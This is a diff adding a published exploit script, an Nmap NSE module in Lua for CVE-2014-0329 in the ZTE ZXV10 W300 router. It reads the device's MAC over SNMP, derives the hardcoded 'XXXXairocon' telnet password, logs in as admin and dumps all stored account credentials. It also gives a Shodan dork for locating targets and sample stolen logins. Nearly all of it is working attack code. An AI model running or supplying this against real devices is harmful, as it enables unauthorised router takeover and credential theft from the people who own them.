@@ -1,0 +1,258 @@
+# Exploit Title: ZTE ZXV10 W300 router contains hardcoded credentials
+# Date: 03 Feb 2014
+# Exploit Author: Cesar Neira
+# Vendor Homepage: http://wwwen.zte.com.cn/
+# Version: ZTE ZXV10 W300 v2.1
+# CVE : CVE-2014-0329
+# Dork (Shodan): Basic realm="index.htm"
+# References:
+http://alguienenlafisi.blogspot.com/2014/02/hackeando-el-router-zte-zxv10-w300-v21.html
+
+
+local nmap = require "nmap"
+local stdnse = require "stdnse"
+local snmp = require "snmp"
+local vulns = require "vulns"
+
+description = [[
+ZTE ZXV10 W300 router contains hardcoded credentials that are useable for the
+telnet service on the device. The username is "admin" and the password is
+"XXXXairocon" where "XXXX" is the last four characters of the device's MAC
+address. The MAC address is obtainable over SNMP with community string public.
+]]
+author = "Cesar Neira"
+license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+categories = {"vuln", "exploit", "intrusive"}
+
+---
+--
+-- @usage nmap -sU -sS -p U:161,T:23 --script=airocon example.org
+-- @output
+-- PORT    STATE         SERVICE
+-- 23/tcp  open          telnet
+-- 161/udp open|filtered snmp
+-- 
+-- Host script results:
+-- | airocon: 
+-- |   VULNERABLE:
+-- |   ZTE ZXV10 W300 router contains hardcoded credentials
+-- |     State: VULNERABLE (Exploitable)
+-- |     IDs:  CVE:CVE-2014-0329
+-- |     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+-- |     Description:
+-- |       ZTE ZXV10 W300 router contains hardcoded credentials that are useable for the telnet
+-- |       service on the device. The username is "admin" and the password is "XXXXairocon"
+-- |       where "XXXX" is the last four characters of the device's MAC address. The MAC address
+-- |       is obtainable over SNMP with community string public.
+-- |     Disclosure date: 2014-2-3
+-- |     Exploit results:
+-- |       admin:1234
+-- |       support:1234
+-- |       admin:0E91airocon
+-- |     References:
+-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0329
+-- |       http://alguienenlafisi.blogspot.com/2014/02/hackeando-el-router-zte-zxv10-w300-v21.html
+-- |_      http://www.kb.cert.org/vuls/id/228886
+
+-- @args community SNMP community (Default: public)
+--
+---
+
+
+local DEFAULT_COMMUNITY = "public"
+
+
+hostrule = function(host)
+    local snmp_port, telnet_port
+    
+    snmp_port = nmap.get_port_state(host, {number=161, protocol="udp"})
+    if not snmp_port  and not (snmp_port.state == "open" or snmp_port.state == "open|filtered") then
+        return false
+    end
+    
+    telnet_port = nmap.get_port_state(host, {number=23, protocol="tcp"})
+    if not telnet_port and not telnet_port.state == "open" then
+        return false
+    end
+    
+    return true
+end
+
+
+local get_mac = function(host, community)
+	local socket, status, response
+	
+	socket = nmap.new_socket("udp")
+	socket:set_timeout(5000)
+
+	status, response = socket:connect(host, 161)
+	
+	if not status then
+	    socket:close()
+	    return status, response
+	end
+	
+	local payload, request
+
+	request = snmp.buildGetRequest({}, ".1.3.6.1.2.1.2.2.1.6.10000")
+	payload = snmp.encode(snmp.buildPacket(request, 0, community))
+	
+	status, response = socket:send(payload)
+	
+	if not status then
+	    socket:close()
+	    return status, response
+	end
+	
+    status, response = socket:receive_bytes(1)
+    
+    if not status then
+        socket:close()
+        return status, response
+    end
+    
+    socket:close()
+    
+    local result
+	result = snmp.fetchFirst(response)
+    
+    if not result then
+        return false, "Unexpected response value."
+    end
+    
+    return true, stdnse.tohex(result)
+end
+
+
+local dump_creds = function(host, user, password)
+    local socket, status, response
+    
+    socket = nmap.new_socket("tcp")
+    socket:set_timeout(5000)
+    
+    status, response = socket:connect(host, 23)
+    
+    if not status then
+        socket:close()
+	    return status, response
+	end
+	
+	local payload
+	payload = user .. "\r" .. password .. "\rsh\rlogin show\rexit\r"
+	
+	status, response = socket:send(payload)
+	
+	if not status then
+	    socket:close()
+	    return status, response
+	end
+	
+	status, response = socket:receive_buf("exit", false)
+	
+	if not status then
+	    socket:close()
+	    return status, response
+	end
+	
+	socket:close()
+	
+	return true, response
+end
+
+
+local parse_response = function(response)
+    local index
+    
+	index = string.find(response, "Username +Password +Priority")
+	
+	if not index then
+	    return false, "Unexpected response value."
+	end
+
+	index = string.find(response, "\r\n", index) + 2
+	response = string.sub(response, index)
+
+    local result, endl, line
+    result = {}
+	
+	index = 0
+	endl = string.find(response, "\r\n", index)
+
+	while endl do
+	    line = string.sub(response, index, endl)
+	    line = string.gsub(line, "\r", "")
+        line = string.gsub(line, "^ +", "")
+        line = string.gsub(line, " +$", "")
+        line = string.gsub(line, " +", " ")
+        
+        local user, pass, prio
+        for user, pass, prio in string.gmatch(line, "([^ ]+) ([^ ]+) ([^ ]+)") do
+            local aux = {}
+            aux['username'] = user
+            aux['password'] = pass
+            aux['priority'] = prio
+            table.insert(result, aux)
+        end
+	    
+	    index = endl + 2
+	    endl = string.find(response, "\r\n", index)
+	end
+	
+    return true, result
+end
+
+
+action = function(host)
+    local vuln = {
+        title = "ZTE ZXV10 W300 router contains hardcoded credentials",
+        state = vulns.STATE.NOT_VULN,
+        IDS = {CVE = 'CVE-2014-0329'},
+        risk_factor = "High",
+        scores = {
+            CVSSv2 = "9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)",
+        },
+        description = [[
+ZTE ZXV10 W300 router contains hardcoded credentials that are useable for the telnet
+service on the device. The username is "admin" and the password is "XXXXairocon"
+where "XXXX" is the last four characters of the device's MAC address. The MAC address
+is obtainable over SNMP with community string public.]],
+        references = {
+            "http://www.kb.cert.org/vuls/id/228886",
+            "http://alguienenlafisi.blogspot.com/2014/02/hackeando-el-router-zte-zxv10-w300-v21.html"
+        },
+        dates = {
+            disclosure = {year = 2014, month = 2, day = 3},
+        },
+        exploit_results = {},
+    }
+
+    local community
+    community = stdnse.get_script_args(SCRIPT_NAME .. ".community") or DEFAULT_COMMUNITY
+    
+    local status, response
+    
+    status, response = get_mac(host, community)    
+    if not status then
+        return response
+    end
+    
+    local password
+    password = string.upper(string.sub(response, 9)) .. "airocon"
+    
+    status, response = dump_creds(host, "admin", password)
+    if not status then
+        return response
+    end
+    
+    status, response = parse_response( response )
+    if not status then
+        return response
+    end
+    
+    vuln.state = vulns.STATE.EXPLOIT
+    for _, data in pairs(response) do
+        table.insert(vuln.exploit_results, data.username .. ":" .. data.password)
+    end
+    
+    return vulns.Report:new(SCRIPT_NAME, host):make_output(vuln)
+end
